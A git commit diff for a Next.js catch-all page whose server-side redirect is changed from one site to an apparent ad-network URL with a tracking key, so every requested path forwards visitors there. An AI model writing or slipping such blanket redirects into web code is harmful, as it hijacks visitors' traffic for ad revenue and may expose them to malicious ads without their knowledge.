7fc18eeecd07df13a345e02d4dd3805ea99583d6
jannatunn760 <jannatunn760@gmail.com>
2024-11-16 21:26:57 +0600

    Update [...postpath].tsx

--- page/[...postpath].tsx
+++ page/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://www.profitablecpmrate.com/kv06fucssp?key=95c2497d10e2f737018c9de282a581d2/` + encodeURI(path as string)
 				}`,
 			},
 		};
